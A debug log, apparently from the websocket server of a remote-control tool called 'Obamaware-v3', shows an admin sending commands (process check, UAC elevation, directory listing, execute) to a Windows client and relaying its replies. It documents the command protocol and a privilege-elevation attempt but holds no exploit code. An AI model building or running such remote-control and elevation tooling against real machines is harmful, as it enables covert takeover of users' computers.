+[2026-01-20 19:44:57] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:44:57] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:44:57] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:44:57] iterated admin loop
+[2026-01-20 19:44:57] Client disconnected: ('127.0.0.1', 38624)
+[2026-01-20 19:44:57] Client disconnected: ('127.0.0.1', 38634)
+[2026-01-20 19:45:05] Connected: ('127.0.0.1', 51110)
+[2026-01-20 19:45:05] ('127.0.0.1', 51110) is admin
+[2026-01-20 19:45:07] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:45:07] waiting for admin commands...
+[2026-01-20 19:45:08] Command from Admin: __PROC__
+[2026-01-20 19:45:08] Waiting for client Reply...
+[2026-01-20 19:45:08] No Client connected.
+[2026-01-20 19:45:08] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:45:08] iterated admin loop
+[2026-01-20 19:45:09] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:45:09] waiting for admin commands...
+[2026-01-20 19:45:10] Command from Admin: __PROC__
+[2026-01-20 19:45:10] Waiting for client Reply...
+[2026-01-20 19:45:10] No Client connected.
+[2026-01-20 19:45:10] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:45:10] iterated admin loop
+[2026-01-20 19:45:11] Connected: ('127.0.0.1', 33132)
+[2026-01-20 19:45:11] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:45:11] waiting for admin commands...
+[2026-01-20 19:45:11] Set Client to: ('127.0.0.1', 33132)
+[2026-01-20 19:45:11] Command from Admin: __PROC__
+[2026-01-20 19:45:11] Waiting for client Reply...
+[2026-01-20 19:45:11] No Client connected.
+[2026-01-20 19:45:11] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:45:11] iterated admin loop
+[2026-01-20 19:45:11] waiting for admin commands...
+[2026-01-20 19:45:12] Command from Admin: __PROC__
+[2026-01-20 19:45:12] Waiting for client Reply...
+[2026-01-20 19:45:12] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:45:12] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:45:12] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:45:12] iterated admin loop
+[2026-01-20 19:45:12] waiting for admin commands...
+[2026-01-20 19:45:18] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:45:18] Waiting for client Reply...
+[2026-01-20 19:45:18] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:45:21] Reply from Client: A subdirectory or file C:\Users\vikto\AppData\Roaming\Microsoft\Windows already exists.
+C:\Users\vikto\AppData\Local\Obamaware-v3\start_elevateable.exe 
+The system cannot find the file specified.
+        0 file(s) copied.
+Started elevation via UAC
+[2026-01-20 19:45:21] [send_ws] sending 255 bytes: 81 7E 00 FB 41 20 73 75 62 64 69 72 65 63 74 6F 72 79 20 6F 72 20 66 69 6C 65 20 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C 4D 69 63 72 6F 73 ...  ascii='�~\x00�A subdirectory or file C:\\Users\\vikto\\AppData\\Roaming\\Microsoft\\Windows already exists.\r\nC:\\Users\\vikto\\AppData\\Local\\Obamaware-v3\\start_elevateable.exe \r\nThe system cannot find the file specified.\r\n        0 file(s) copied.\r\nStarted elevation via UAC'
+[2026-01-20 19:45:21] iterated admin loop
+[2026-01-20 19:45:21] waiting for admin commands...
+[2026-01-20 19:45:41] iterated admin loop
+[2026-01-20 19:45:41] waiting for admin commands...
+[2026-01-20 19:46:01] iterated admin loop
+[2026-01-20 19:46:01] waiting for admin commands...
+[2026-01-20 19:46:21] iterated admin loop
+[2026-01-20 19:46:21] waiting for admin commands...
+[2026-01-20 19:46:41] iterated admin loop
+[2026-01-20 19:46:41] waiting for admin commands...
+[2026-01-20 19:47:01] iterated admin loop
+[2026-01-20 19:47:01] waiting for admin commands...
+[2026-01-20 19:47:21] iterated admin loop
+[2026-01-20 19:47:21] waiting for admin commands...
+[2026-01-20 19:47:26] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:47:26] Waiting for client Reply...
+[2026-01-20 19:47:26] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:47:39] No reply from Client.
+[2026-01-20 19:47:39] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:47:39] iterated admin loop
+[2026-01-20 19:47:39] waiting for admin commands...
+[2026-01-20 19:47:39] admin socket dead.
+[2026-01-20 19:47:39] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:47:39] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:47:39] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:47:39] iterated admin loop
+[2026-01-20 19:47:39] Client disconnected: ('127.0.0.1', 51110)
+[2026-01-20 19:47:40] Client disconnected: ('127.0.0.1', 33132)
+[2026-01-20 19:48:01] Connected: ('127.0.0.1', 54056)
+[2026-01-20 19:48:02] ('127.0.0.1', 54056) is admin
+[2026-01-20 19:48:03] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:48:03] waiting for admin commands...
+[2026-01-20 19:48:04] Command from Admin: __PROC__
+[2026-01-20 19:48:04] Waiting for client Reply...
+[2026-01-20 19:48:04] No Client connected.
+[2026-01-20 19:48:04] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:48:04] iterated admin loop
+[2026-01-20 19:48:05] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:48:05] waiting for admin commands...
+[2026-01-20 19:48:05] Command from Admin: __PROC__
+[2026-01-20 19:48:05] Waiting for client Reply...
+[2026-01-20 19:48:05] No Client connected.
+[2026-01-20 19:48:05] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:48:05] iterated admin loop
+[2026-01-20 19:48:06] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:48:06] waiting for admin commands...
+[2026-01-20 19:48:07] Connected: ('127.0.0.1', 54068)
+[2026-01-20 19:48:07] Command from Admin: __PROC__
+[2026-01-20 19:48:07] Waiting for client Reply...
+[2026-01-20 19:48:07] No Client connected.
+[2026-01-20 19:48:07] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:48:07] iterated admin loop
+[2026-01-20 19:48:07] Set Client to: ('127.0.0.1', 54068)
+[2026-01-20 19:48:07] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:48:07] waiting for admin commands...
+[2026-01-20 19:48:08] Command from Admin: __PROC__
+[2026-01-20 19:48:08] Waiting for client Reply...
+[2026-01-20 19:48:08] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:48:08] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:48:08] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:48:08] iterated admin loop
+[2026-01-20 19:48:08] waiting for admin commands...
+[2026-01-20 19:48:10] Command from Admin: __CD__ ### cd
+[2026-01-20 19:48:10] Waiting for client Reply...
+[2026-01-20 19:48:10] [send_ws] sending 15 bytes: 81 0D 5F 5F 43 44 5F 5F 20 23 23 23 20 63 64  ascii='�\r__CD__ ### cd'
+[2026-01-20 19:48:10] Reply from Client: C:\Windows\System32
+[2026-01-20 19:48:10] [send_ws] sending 21 bytes: 81 13 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32  ascii='�\x13C:\\Windows\\System32'
+[2026-01-20 19:48:10] iterated admin loop
+[2026-01-20 19:48:10] waiting for admin commands...
+[2026-01-20 19:48:14] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:48:14] Waiting for client Reply...
+[2026-01-20 19:48:14] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:48:15] Reply from Client: A subdirectory or file C:\Users\vikto\AppData\Roaming\Microsoft\Windows already exists.
+        1 file(s) copied.
+Started elevation via UAC
+[2026-01-20 19:48:15] [send_ws] sending 145 bytes: 81 7E 00 8D 41 20 73 75 62 64 69 72 65 63 74 6F 72 79 20 6F 72 20 66 69 6C 65 20 43 3A 5C 55 73 65 72 73 5C 76 69 6B 74 6F 5C 41 70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C 4D 69 63 72 6F 73 ...  ascii='�~\x00�A subdirectory or file C:\\Users\\vikto\\AppData\\Roaming\\Microsoft\\Windows already exists.\r\n        1 file(s) copied.\r\nStarted elevation via UAC'
+[2026-01-20 19:48:15] iterated admin loop
+[2026-01-20 19:48:15] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] waiting for admin commands...
+[2026-01-20 19:48:19] No command from Admin, resetting connection...
+[2026-01-20 19:48:19] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:48:19] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:48:19] iterated admin loop
+[2026-01-20 19:48:19] Client disconnected: ('127.0.0.1', 54056)
+[2026-01-20 19:48:19] Client disconnected: ('127.0.0.1', 54068)
+[2026-01-20 19:48:49] Connected: ('127.0.0.1', 37276)
+[2026-01-20 19:48:49] ('127.0.0.1', 37276) is admin
+[2026-01-20 19:48:51] waiting for admin commands...
+[2026-01-20 19:48:55] Command from Admin: __PROC__
+[2026-01-20 19:48:55] Waiting for client Reply...
+[2026-01-20 19:48:55] No Client connected.
+[2026-01-20 19:48:55] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:48:55] iterated admin loop
+[2026-01-20 19:48:55] Connected: ('127.0.0.1', 37284)
+[2026-01-20 19:48:55] Set Client to: ('127.0.0.1', 37284)
+[2026-01-20 19:48:56] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 19:48:56] waiting for admin commands...
+[2026-01-20 19:48:57] Command from Admin: __PROC__
+[2026-01-20 19:48:57] Waiting for client Reply...
+[2026-01-20 19:48:57] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:48:57] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:48:57] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:48:57] iterated admin loop
+[2026-01-20 19:48:57] waiting for admin commands...
+[2026-01-20 19:49:08] Command from Admin: __PROC__
+[2026-01-20 19:49:08] Waiting for client Reply...
+[2026-01-20 19:49:08] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:49:08] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:49:08] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:49:08] iterated admin loop
+[2026-01-20 19:49:08] waiting for admin commands...
+[2026-01-20 19:49:14] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:49:14] Waiting for client Reply...
+[2026-01-20 19:49:14] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:49:53] Connected: ('127.0.0.1', 58906)
+[2026-01-20 19:49:53] ('127.0.0.1', 58906) is admin
+[2026-01-20 19:49:53] waiting for admin commands...
+[2026-01-20 19:49:57] Connected: ('127.0.0.1', 58908)
+[2026-01-20 19:49:58] Set Client to: ('127.0.0.1', 58908)
+[2026-01-20 19:49:58] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:49:58] Waiting for client Reply...
+[2026-01-20 19:49:58] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:49:58] Client disconnected: ('127.0.0.1', 37284)
+[2026-01-20 19:50:40] Connected: ('127.0.0.1', 49916)
+[2026-01-20 19:50:40] ('127.0.0.1', 49916) is admin
+[2026-01-20 19:50:40] waiting for admin commands...
+[2026-01-20 19:50:42] Command from Admin: __PROC__
+[2026-01-20 19:50:42] Waiting for client Reply...
+[2026-01-20 19:50:42] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:50:43] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:50:43] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:50:43] iterated admin loop
+[2026-01-20 19:50:43] waiting for admin commands...
+[2026-01-20 19:50:45] Connected: ('127.0.0.1', 49932)
+[2026-01-20 19:50:46] Set Client to: ('127.0.0.1', 49932)
+[2026-01-20 19:50:46] Client disconnected: ('127.0.0.1', 58908)
+[2026-01-20 19:50:49] Connected: ('127.0.0.1', 50686)
+[2026-01-20 19:50:49] Set Client to: ('127.0.0.1', 50686)
+[2026-01-20 19:50:50] Client disconnected: ('127.0.0.1', 49932)
+[2026-01-20 19:50:52] Connected: ('127.0.0.1', 50692)
+[2026-01-20 19:50:53] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] [ERROR] recv_one_frame exception: [Errno 9] Bad file descriptor
+[2026-01-20 19:50:53] No reply from Client.
+[2026-01-20 19:50:53] No reply from Client.
+[2026-01-20 19:50:53] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:50:53] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:50:53] Set Client to: ('127.0.0.1', 50692)
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] Client disconnected: ('127.0.0.1', 37276)
+[2026-01-20 19:50:53] Client disconnected: ('127.0.0.1', 58906)
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] waiting for admin commands...
+[2026-01-20 19:50:53] No command from Admin, resetting connection...
+[2026-01-20 19:50:53] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:50:53] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:50:53] iterated admin loop
+[2026-01-20 19:50:53] Client disconnected: ('127.0.0.1', 49916)
+[2026-01-20 19:50:53] Client disconnected: ('127.0.0.1', 50692)
+[2026-01-20 19:50:53] Client disconnected: ('127.0.0.1', 50686)
+[2026-01-20 19:50:55] Connected: ('127.0.0.1', 50708)
+[2026-01-20 19:50:55] Connected: ('127.0.0.1', 50706)
+[2026-01-20 19:50:55] Set Client to: ('127.0.0.1', 50708)
+[2026-01-20 19:50:55] Set Client to: ('127.0.0.1', 50706)
+[2026-01-20 19:50:56] Client disconnected: ('127.0.0.1', 50708)
+[2026-01-20 19:50:58] Connected: ('127.0.0.1', 50718)
+[2026-01-20 19:50:58] Set Client to: ('127.0.0.1', 50718)
+[2026-01-20 19:50:59] Client disconnected: ('127.0.0.1', 50706)
+[2026-01-20 19:51:09] Connected: ('127.0.0.1', 56694)
+[2026-01-20 19:51:09] ('127.0.0.1', 56694) is admin
+[2026-01-20 19:51:09] waiting for admin commands...
+[2026-01-20 19:51:15] Connected: ('127.0.0.1', 56702)
+[2026-01-20 19:51:15] Command from Admin: __PROC__
+[2026-01-20 19:51:15] Waiting for client Reply...
+[2026-01-20 19:51:15] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:51:15] Set Client to: ('127.0.0.1', 56702)
+[2026-01-20 19:51:15] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:51:15] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:51:15] iterated admin loop
+[2026-01-20 19:51:15] waiting for admin commands...
+[2026-01-20 19:51:16] Client disconnected: ('127.0.0.1', 50718)
+[2026-01-20 19:51:17] Connected: ('127.0.0.1', 56708)
+[2026-01-20 19:51:17] Set Client to: ('127.0.0.1', 56708)
+[2026-01-20 19:51:18] Client disconnected: ('127.0.0.1', 56702)
+[2026-01-20 19:51:20] Connected: ('127.0.0.1', 39444)
+[2026-01-20 19:51:23] Set Client to: ('127.0.0.1', 39444)
+[2026-01-20 19:51:23] Client disconnected: ('127.0.0.1', 56708)
+[2026-01-20 19:51:26] Connected: ('127.0.0.1', 39452)
+[2026-01-20 19:51:26] Set Client to: ('127.0.0.1', 39452)
+[2026-01-20 19:51:27] Client disconnected: ('127.0.0.1', 39444)
+[2026-01-20 19:51:35] iterated admin loop
+[2026-01-20 19:51:35] waiting for admin commands...
+[2026-01-20 19:51:37] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 19:51:37] Waiting for client Reply...
+[2026-01-20 19:51:37] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 19:51:54] Reply from Client: C:\Windows\System32
+[2026-01-20 19:51:54] [send_ws] sending 21 bytes: 81 13 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32  ascii='�\x13C:\\Windows\\System32'
+[2026-01-20 19:51:54] iterated admin loop
+[2026-01-20 19:51:54] waiting for admin commands...
+[2026-01-20 19:51:54] admin socket dead.
+[2026-01-20 19:51:54] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:51:54] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:51:54] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:51:54] iterated admin loop
+[2026-01-20 19:51:54] Client disconnected: ('127.0.0.1', 56694)
+[2026-01-20 19:51:54] Client disconnected: ('127.0.0.1', 39452)
+[2026-01-20 19:51:56] Connected: ('127.0.0.1', 57962)
+[2026-01-20 19:51:56] Set Client to: ('127.0.0.1', 57962)
+[2026-01-20 19:52:09] Connected: ('127.0.0.1', 40204)
+[2026-01-20 19:52:09] Set Client to: ('127.0.0.1', 40204)
+[2026-01-20 19:52:09] Client disconnected: ('127.0.0.1', 57962)
+[2026-01-20 19:52:11] Connected: ('127.0.0.1', 39214)
+[2026-01-20 19:52:12] Set Client to: ('127.0.0.1', 39214)
+[2026-01-20 19:52:12] Client disconnected: ('127.0.0.1', 40204)
+[2026-01-20 19:52:15] Connected: ('127.0.0.1', 39226)
+[2026-01-20 19:52:15] Set Client to: ('127.0.0.1', 39226)
+[2026-01-20 19:52:16] Client disconnected: ('127.0.0.1', 39214)
+[2026-01-20 19:52:18] Connected: ('127.0.0.1', 39238)
+[2026-01-20 19:52:18] Set Client to: ('127.0.0.1', 39238)
+[2026-01-20 19:52:19] Client disconnected: ('127.0.0.1', 39226)
+[2026-01-20 19:52:23] Connected: ('127.0.0.1', 41916)
+[2026-01-20 19:52:23] Set Client to: ('127.0.0.1', 41916)
+[2026-01-20 19:52:23] Client disconnected: ('127.0.0.1', 39238)
+[2026-01-20 19:52:26] Connected: ('127.0.0.1', 41924)
+[2026-01-20 19:52:26] Set Client to: ('127.0.0.1', 41924)
+[2026-01-20 19:52:26] Client disconnected: ('127.0.0.1', 41916)
+[2026-01-20 19:52:28] Connected: ('127.0.0.1', 41926)
+[2026-01-20 19:52:29] Set Client to: ('127.0.0.1', 41926)
